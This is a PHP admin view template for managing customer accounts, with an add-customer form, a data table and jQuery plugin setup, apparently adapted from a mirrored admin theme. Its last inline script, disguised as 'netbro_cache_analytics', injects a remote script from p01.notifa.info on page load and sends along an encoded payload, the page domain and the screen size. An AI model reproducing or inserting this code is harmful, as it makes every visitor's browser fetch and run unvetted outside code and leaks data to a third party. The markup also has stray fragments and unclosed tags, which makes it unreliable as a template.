

<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:39:23 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->

    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url();?>assets/images/favicon.png">
    <?php if($action == 'add') {?>
        <title>Add Customer</title>
    <?php }elseif($action == 'edit'){?>
        <title>Edit Customer</title>
    <?php }else{?>
        <title>Manage Customers</title>
    <?php } ?>


    <!-- This page CSS -->
    <!-- chartist CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/morrisjs/morris.css" rel="stylesheet">
    <!--Toaster Popup message CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/toast-master/css/jquery.toast.css" rel="stylesheet">
    <!--c3 plugins CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/c3-master/c3.min.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/style.min.css" rel="stylesheet">
    <!-- Dashboard 1 Page CSS -->
    <link href="<?php echo base_url();?>assets/dist/css/pages/dashboard1.css" rel="stylesheet">
    <!-- Pagu Upload -->
    <link rel="stylesheet" href="<?php echo base_url();?>assets/node_modules/dropify/dist/css/dropify.min.css">
    <!--alerts CSS -->
    <link href="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.css" rel="stylesheet" type="text/css">

    <!-- page css -->

    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-datepicker/bootstrap-datepicker.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/select2/dist/css/select2.min.css" rel="stylesheet" type="text/css" />
    <link href="<?php echo base_url();?>assets/node_modules/switchery/dist/switchery.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-select/bootstrap-select.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.min.css" rel="stylesheet" />
    <link href="<?php echo base_url();?>assets/node_modules/multiselect/css/multi-select.css" rel="stylesheet" type="text/css" />
    <!-- <link href="<?php echo base_url();?>assets/dist/css/pages/floating-label.css" rel="stylesheet"> -->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
 <style type="text/css">
    .select2{
         display: block;
          width: 100%;
          padding: 0.375rem 0.75rem;
          font-size: 0.875rem;
          line-height: 1.5;
          color: #4F5467;
          background-color: #fff;
          background-clip: padding-box;
          border: 1px solid #e9ecef;
          border-radius: 0.25rem;
          -webkit-transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          -o-transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
          transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out, -webkit-box-shadow 0.15s ease-in-out;
          
    }
    .select2-container--default .select2-selection--single{
         border: 0px solid #aaa;
    }

    .editor{
    display: none;
}

</style>
</head>

<body class="fixed-layout lock-nav skin-green-dark">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
            <div class="loader__figure"></div>
            <p class="loader__label"> GOODEVA </p>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <div id="main-wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->

        <?php $this->load->view('admin/common/topbar'); ?>
        
        <!-- ============================================================== -->
        <!-- End Topbar header -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        
        <?php $this->load->view('admin/common/sidebar'); ?>

        <!-- ============================================================== -->
        <!-- End Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page wrapper  -->
        <!-- ============================================================== -->
        <div class="page-wrapper">
            <!-- ============================================================== -->
            <!-- Container fluid  -->
            <!-- ============================================================== -->


<!-- ==================================================================================================================== -->

            <!-- ====================================================== -->
            <!--  Content -->
            <!-- ====================================================== -->
            <div class="container-fluid">
                
               
                <!-- CUSTOM SONTENT HERE !! -->
                <!-- Create Data -->
                    <?php if($action == 'add') { ?>
                        <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">Customer</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">Customer</li>
                                        <li class="breadcrumb-item active">Add Customer</li
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== --> 
                        <a href="<?php echo base_url('admin-area/customer') ?>"><button type="button" class="btn btn-warning m-b-10"><i class="fa fa-plus-circle"></i> Manage Customer</button></a>   
                            <div class="row">
                                <div class="col-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="card-title">Add Customer</h4>
                                            <h6 class="card-subtitle">Add new Customer/User </h6>

                                            <!-- Notif Status-->
                                            <?php if ($status_action == 'email'): ?>
                                            <div class="alert alert-warning"> 
                                                <i class="fa fa-warning"></i> Email sudah ada.
                                                <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                            </div>
                                            <?php endif ?>


                                            <form class="m-t-40" action="<?php echo base_url('admin-area/create-customer-account'); ?>" method="post" enctype="multipart/form-data" novalidate>

                                                    
                                                <div class="form-group">
                                                    <h5>Nama <span class="text-danger">*</span></h5>
                                                    <div class="controls">
                                                        <input type="text" name="nama"  class="form-control" required data-validation-required-message="This field is required"> </div>
                                                    <div class="form-control-feedback"></div>
                                                </div>

                                                <div class="form-group">
                                                    <h5>Email <span class="text-danger">*</span></h5>
                                                    <div class="controls">
                                                        <input type="email" name="email" class="form-control" required data-validation-required-message="This field is required"> </div>
                                                </div>

                                                <div class="form-group">
                                                    <h5>Password <span class="text-danger">*</span></h5>
                                                    <div class="controls">
                                                        <input type="password" name="password" class="form-control" required data-validation-required-message="This field is required" maxlength='15' minlength="5"> </div>
                                                </div>

                                                <div class="form-group">
                                                    <h5>Ulangi Password <span class="text-danger">*</span></h5>
                                                    <div class="controls">
                                                        <input type="password" name="password2" data-validation-match-match="password" class="form-control" maxlength='15' required> </div>
                                                </div>
                                                <div class="row">
                                                    <div class="col-md-3">
                                                    <div class="form-group">
                                                        <h5>Status <span class="text-danger">*</span></h5>
                                                        <fieldset class="controls">
                                                            <div class="custom-control custom-radio">
                                                                <input type="radio" value="1" name="status" required id="styled_radio1" class="custom-control-input">
                                                                <label class="custom-control-label" for="styled_radio1">Aktif</label>
                                                            </div>
                                                        
                                                            <div class="custom-control custom-radio">
                                                                <input type="radio" value="0" name="status" id="styled_radio2" class="custom-control-input">
                                                                <label class="custom-control-label" for="styled_radio2">Nonaktif</label>
                                                            </div>
                                                        </fieldset>
                                                    </div>
                                                    </div>

                                                    <div class="col-md-5">
                                                    <div class="form-group">
                                                        <h5>Pilih Type Admin <span class="text-danger">*</span></h5>
                                                        <div class="controls">
                                                            <select name="type_admin" id="select" required class="form-control">
                                                                <option value="">--Type Admin </option>
                                                                <?php foreach ($type_admin    as $type_admin): ?>
                                                                <option value="<?php echo $type_admin->id ?>"><?php echo $type_admin->type ?></option>
                                                                <?php endforeach ?>
                                                                
                                                                
                                                                
                                                            </select>
                                                        </div>
                                                    </div>
                                                    </div>

                                                    <div class="col-md-4">
                                                    <div class="form-group">
                                                        <h5>Pilih Foto Profil <span class="text-danger">*</span></h5>
                                                        <div class="controls">
                                                        <input type="file" id="input-file-now-custom-3" name="photo" class="dropify" data-height="100%" class="form-control"  >
                                                        </div>

                                                    </div>
                                                    </div>
                                                </div>


                                                                                           
                                                <div class="text-xs-right">
                                                    <button type="submit" class="btn btn-info">Submit</button>
                                                    <button type="reset" class="btn btn-inverse">Cancel</button>
                                                </div>

                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>

                    <?php } ?>
                    <!-- End Create Data -!>


                       <!-- Read data -->
                    <?php if($action == '') {?> 
                        <!-- ============================================================== -->
                        <!-- Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->
                        <div class="row page-titles">
                            <div class="col-md-5 align-self-center">
                                <h4 class="text-themecolor">Customer Account</h4>
                            </div>
                            <div class="col-md-7 align-self-center text-right">
                                <div class="d-flex justify-content-end align-items-center">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="javascript:void(0)">Home</a></li>
                                        <li class="breadcrumb-item">Customer Account</li>
                                        <li class="breadcrumb-item active">Manage Customer</li
                                    </ol>
                                    <!-- <button type="button" class="btn btn-success d-none d-lg-block m-l-15"><i class="fa fa-plus-circle"></i> Create New</button> -->
                                </div>
                            </div>
                        </div>
                        <!-- ============================================================== -->
                        <!-- End Bread crumb and right sidebar toggle -->
                        <!-- ============================================================== -->    


                        <a href="?action=add"><button type="button" class="btn btn-success m-b-10"><i class="fa fa-plus-circle"></i> Add Customer</button></a>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="card">
                                    <div class="card-body">
                                        <h4 class="card-title">Manage Customer</h4>
                                        <h6 class="card-subtitle">Customer Data</h6>
                                        <hr>

                                        <!-- Notif Status-->
                                        <?php if ($status_action == 'save'): ?>
                                        <div class="alert alert-success"> 
                                            <i class="fa fa-check-circle"></i> Data berhasil di Tambahkan.
                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                        </div>
                                        <?php endif ?>

                                        <?php if ($status_action == 'update'): ?>
                                        <div class="alert alert-warning"> 
                                            <i class="fa fa-check-circle"></i> Data berhasil di Update.
                                            <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">×</span> </button>
                                        </div>
                                        <?php endif ?>
                                        <!-- End Notif Status -->

                                        

                                        
                                        


                                        <div class="table-responsive ">

                                            <table id="myTable" class="nowrap table table-bordered table-striped ">
                                                <thead>
                                                    <tr >
                                                        <th>No</th>
                                                        <th>Nama</th>
                                                        <th>Email</th>
                                                        <th>Perusahaan</th>
                                                        <th></th>
                                                        <th scope="col">Aksi</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                               
                                                    
                                                  
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    <?php } ?>
                    <!-- End Read Data -->

             

             

         
          


                    


                <!-- END CUSTOM SONTENT HERE !! -->






                <!-- ============================================================== -->
                <!-- Right sidebar -->
                <!-- ============================================================== -->
                <!-- .right-sidebar -->
                <div class="right-sidebar">
                    <div class="slimscrollright">
                        <div class="rpanel-title"> Service Panel <span><i class="ti-close right-side-toggle"></i></span> </div>
                        <div class="r-panel-body">
                            <ul id="themecolors" class="m-t-20">
                                <li><b>With Light sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default" class="default-theme">1</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green" class="green-theme">2</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red" class="red-theme">3</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue" class="blue-theme">4</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple" class="purple-theme">5</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna" class="megna-theme">6</a></li>
                                <li class="d-block m-t-30"><b>With Dark sidebar</b></li>
                                <li><a href="javascript:void(0)" data-skin="skin-default-dark" class="default-dark-theme">7</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-green-dark" class="green-dark-theme">8</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-red-dark" class="red-dark-theme working">9</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-blue-dark" class="blue-dark-theme">10</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-purple-dark" class="purple-dark-theme">11</a></li>
                                <li><a href="javascript:void(0)" data-skin="skin-megna-dark" class="megna-dark-theme ">12</a></li>
                            </ul>
                            <ul class="m-t-20 chatonline">
                                <li><b>Chat option</b></li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/1.jpg" alt="user-img" class="img-circle"> <span>Varun Dhavan <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/2.jpg" alt="user-img" class="img-circle"> <span>Genelia Deshmukh <small class="text-warning">Away</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/3.jpg" alt="user-img" class="img-circle"> <span>Ritesh Deshmukh <small class="text-danger">Busy</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/4.jpg" alt="user-img" class="img-circle"> <span>Arijit Sinh <small class="text-muted">Offline</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/5.jpg" alt="user-img" class="img-circle"> <span>Govinda Star <small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/6.jpg" alt="user-img" class="img-circle"> <span>John Abraham<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/7.jpg" alt="user-img" class="img-circle"> <span>Hritik Roshan<small class="text-success">online</small></span></a>
                                </li>
                                <li>
                                    <a href="javascript:void(0)"><img src="<?php echo base_url();?>assets/images/users/8.jpg" alt="user-img" class="img-circle"> <span>Pwandeep rajan <small class="text-success">online</small></span></a>
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
                <!-- ============================================================== -->
                <!-- End Right sidebar -->
                <!-- ============================================================== -->
            </div>
                    <!-- ====================================================== -->
                    <!-- End Content -->
                    <!-- ====================================================== -->

<!-- ==================================================================================================================== -->



            <!-- ============================================================== -->
            <!-- End Container fluid  -->
            <!-- ============================================================== -->
        </div>
        <!-- ============================================================== -->
        <!-- End Page wrapper  -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- footer -->
        <!-- ============================================================== -->
        <?php $this->load->view('admin/common/footer'); ?>
        <!-- ============================================================== -->
        <!-- End footer -->
        <!-- ============================================================== -->
    </div>
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="<?php echo base_url();?>assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
    <!-- Bootstrap popper Core JavaScript -->
    <script src="<?php echo base_url();?>assets/node_modules/popper/popper.min.js"></script>
    <script src="<?php echo base_url();?>assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- slimscrollbar scrollbar JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/perfect-scrollbar.jquery.min.js"></script>
    <!--Wave Effects -->
    <script src="<?php echo base_url();?>assets/dist/js/waves.js"></script>
    <!--Menu sidebar -->
    <script src="<?php echo base_url();?>assets/dist/js/sidebarmenu.js"></script>
    <!--Custom JavaScript -->
    <script src="<?php echo base_url();?>assets/dist/js/custom.min.js"></script>
    <script src="<?php echo base_url();?>assets/dist/js/pages/validation.js"></script>

    <!-- ============================================================== -->
    <!-- This page plugins -->
    <!-- This is data table -->
    <script src="<?php echo base_url();?>assets/node_modules/datatables/jquery.dataTables.min.js"></script>
    cript>

    <script>
    $(document).ready(function() {
        $('#tabelKu').DataTable();
        $(document).ready(function() {
            var table = $('#example').DataTable({

                "columnDefs": [{
                    
                    "targets": [0], //first column / numbering column
                    "orderable": true, //set not orderable
                }],
                "displayLength": 25,
                "drawCallback": function(settings) {
                    var api = this.api();
                    var rows = api.rows({
                        page: 'current'
                    }).nodes();
                    var last = null;
                    api.column(2, {
                        page: 'current'
                    }).data().each(function(group, i) {
                        if (last !== group) {
                            $(rows).eq(i).before('<tr class="group"><td colspan="5">' + group + '</td></tr>');
                            last = group;
                        }
                    });
                }
            });

            // Order by the grouping
            // $('#example tbody').on('click', 'tr.group', function() {
            //     var currentOrder = table.order()[0];
            //     if (currentOrder[0] === 2 && currentOrder[1] === 'asc') {
            //         table.order([2, 'desc']).draw();
            //     } else {
            //         table.order([2, 'asc']).draw();
            //     }
            // });
        });
    });

    $('#myTable').DataTable({
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    });
    </script>


    <!-- jQuery file upload -->
    <script src="<?php echo base_url();?>assets/node_modules/dropify/dist/js/dropify.min.js"></script>
    <script>
    $(document).ready(function() {
        // Basic
        $('.dropify').dropify();

        // Translated
        $('.dropify-fr').dropify({
            messages: {
                default: 'Glissez-déposez un fichier ici ou cliquez',
                replace: 'Glissez-déposez un fichier ou cliquez pour remplacer',
                remove: 'Supprimer',
                error: 'Désolé, le fichier trop volumineux'
            }
        });

        // Used events
        var drEvent = $('#input-file-events').dropify();

        drEvent.on('dropify.beforeClear', function(event, element) {
            return confirm("Do you really want to delete \"" + element.file.name + "\" ?");
        });

        drEvent.on('dropify.afterClear', function(event, element) {
            alert('File deleted');
        });

        drEvent.on('dropify.errors', function(event, element) {
            console.log('Has Errors');
        });

        var drDestroy = $('#input-file-to-destroy').dropify();
        drDestroy = drDestroy.data('dropify')
        $('#toggleDropify').on('click', function(e) {
            e.preventDefault();
            if (drDestroy.isDropified()) {
                drDestroy.destroy();
            } else {
                drDestroy.init();
            }
        })
    });
    </script>

    <script>
    ! function(window, document, $) {
        "use strict";
        $("input,select,textarea").not("[type=submit]").jqBootstrapValidation();
    }(window, document, jQuery);
    </script>


    <!-- Sweet-Alert  -->
    <script src="<?php echo base_url();?>assets/node_modules/sweetalert/sweetalert.min.js"></script>
    <script src="<?php echo base_url();?>assets/node_modules/sweetalert/jquery.sweet-alert.custom.js"></script>


    <script type="text/javascript">

    $(document).on("click",".hapus-brand",function(){
    
    $.ajaxSetup({
      type:"post",
      cache:false,
      dataType: "json"
    })

    var id=$(this).attr("data-id");
    // var nama=$(this).attr("data-name");
    var logo=$(this).attr("data-logo");


        swal({   
            title: "Anda Yakin?",   
            text: "Menghapus data  ?",   
            type: "warning",   
            showCancelButton: true,   
            confirmButtonColor: "#DD6B55",   
            confirmButtonText: "Yes, delete it!",   
            cancelButtonText: "No, cancel plx!",   
            closeOnConfirm: false,   
            closeOnCancel: false 
        }, function(isConfirm){   
            if (isConfirm) {  
                $.ajax({
                data:{id:id,logo:logo},
                url:"<?php echo base_url('Admin-area/delete-brand');?>",
                success: function(html) {
                    $("tr[data-id='"+id+"']").fadeOut(1500,function(){
                        $(this).remove();
                    });
                    swal({   
                        title: "Deleted !",   
                        text: "Sukses dihapus",   
                        type: "success",       
                        confirmButtonText: "Ok",    
                        closeOnConfirm: false,   
                        closeOnCancel: false 
                    });
                }

                })   
               
            } else {     
                swal("Cancelled", "Data batal dihapus.", "error");   
            } 
        });
    });


    </script>

    <script src="<?php echo base_url(); ?>assets/node_modules/switchery/dist/switchery.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/select2/dist/js/select2.full.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-select/bootstrap-select.min.js" type="text/javascript"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-tagsinput/dist/bootstrap-tagsinput.min.js"></script>
    <script src="<?php echo base_url(); ?>assets/node_modules/bootstrap-touchspin/dist/jquery.bootstrap-touchspin.js" type="text/javascript"></script>
    <script type="text/javascript" src="../assets/node_modules/multiselect/js/jquery.multi-select.js"></script>
    <script>
    jQuery(document).ready(function() {
        // Switchery
        var elems = Array.prototype.slice.call(document.querySelectorAll('.js-switch'));
        $('.js-switch').each(function() {
            new Switchery($(this)[0], $(this).data());
        });
        // For select 2
        $(".select2").select2();
        $('.selectpicker').selectpicker();
        //Bootstrap-TouchSpin
        $(".vertical-spin").TouchSpin({
            verticalbuttons: true,
            verticalupclass: 'ti-plus',
            verticaldownclass: 'ti-minus'
        });
        var vspinTrue = $(".vertical-spin").TouchSpin({
            verticalbuttons: true
        });
        if (vspinTrue) {
            $('.vertical-spin').prev('.bootstrap-touchspin-prefix').remove();
        }
        $("input[name='tch1']").TouchSpin({
            min: 0,
            max: 100,
            step: 0.1,
            decimals: 2,
            boostat: 5,
            maxboostedstep: 10,
            postfix: '%'
        });
        $("input[name='tch2']").TouchSpin({
            min: -1000000000,
            max: 1000000000,
            stepinterval: 50,
            maxboostedstep: 10000000,
            prefix: '$'
        });
        $("input[name='posisi']").TouchSpin();
        $("input[name='tch3_22']").TouchSpin({
            initval: 40
        });
        $("input[name='tch5']").TouchSpin({
            prefix: "pre",
            postfix: "post"
        });
        // For multiselect
        $('#pre-selected-options').multiSelect();
        $('#optgroup').multiSelect({
            selectableOptgroup: true
        });
        $('#public-methods').multiSelect();
        $('#select-all').click(function() {
            $('#public-methods').multiSelect('select_all');
            return false;
        });
        $('#deselect-all').click(function() {
            $('#public-methods').multiSelect('deselect_all');
            return false;
        });
        $('#refresh').on('click', function() {
            $('#public-methods').multiSelect('refresh');
            return false;
        });
        $('#add-option').on('click', function() {
            $('#public-methods').multiSelect('addOption', {
                value: 42,
                text: 'test 42',
                index: 0
            });
            return false;
        });
        $(".ajax").select2({
            ajax: {
                url: "https://api.github.com/search/repositories",
                dataType: 'json',
                delay: 250,
                data: function(params) {
                    return {
                        q: params.term, // search term
                        page: params.page
                    };
                },
                processResults: function(data, params) {
                    // parse the results into the format expected by Select2
                    // since we are using custom formatting functions we do not need to
                    // alter the remote JSON data, except to indicate that infinite
                    // scrolling can be used
                    params.page = params.page || 1;
                    return {
                        results: data.items,
                        pagination: {
                            more: (params.page * 30) < data.total_count
                        }
                    };
                },
                cache: true
            },
            escapeMarkup: function(markup) {
                return markup;
            }, // let our custom formatter work
            minimumInputLength: 1,
            // templateResult: formatRepo, // omitted for brevity, see the source of this page
            //templateSelection: formatRepoSelection // omitted for brevity, see the source of this page
        });
    });
    </script>

    <!-- ajax -->
<script type="text/javascript">
            
$(function(){

  $.ajaxSetup({
  type:"post",
  cache:false,
  dataType: "json"
})



// CLick Edit

$(document).on("click","#ubah",function(){
$(this).find("span[class~='caption']").hide();
$(this).find("input[class~='editor']").fadeIn(1000).focus();
});


$(document).on("click","#ubah2",function(){
$(this).find("p[class~='card-text']").hide();
$(this).find("textarea[class~='editor']").fadeIn(1000).focus();
});

    

    









});
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();call
();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m8Ghk4KdVfTtOdzpINRJK8Lq5daklVvl%2b0ekwjWEdI3LkcWt04FU%2fMGdgvPvlk4r8N49s3uqel0%2bRQ5bk0wElt2WxkjEhDArisi1TM0kxZ3gfW3oZWXqN1EisiLm71HF4s473MxGR9d1AhzHXf%2bzbDjoIQvC%2fwki5PNvo7sNVRBfvGMu7TSjmrekcGzamLffm%2f41XXU3zPoM6%2fsICb2HG1HcBtC%2buyil8u3rwrWbYA6bhroR9AZgDIW4iW%2btOTtjbTttqBTO8j6FuIQ4007JaLqEvdPNlFz3fm0wu1Wt9d9B%2b0qjTqAa1mTsk%2fp6uCty1dbRoWloKtjJQ2OUcf8M%2fbO7V8gOAMe0C9WimU49s%2bpG%2bS5Rf1y8od4%2b3D%2ffzJPqoS5lwyzJWkb5GVR2RrFJwQVMrS9%2bjlsbDiOfP8btteDNvWvjgUsf9EgpPdft7F%2fMjDSWDfG0NOO79V%2fvUCQdFmU%2faUULArU1ORrFY8fxqSaQ5mW4geJbskB%2bjAn2DXH9gW1wJjZMP2BBxNpKfSORlnQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
   




   </body>


<!-- Mirrored from www.wrappixel.com/demos/admin-templates/elegant-admin/modern/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 29 Aug 2018 10:42:49 GMT -->
</html>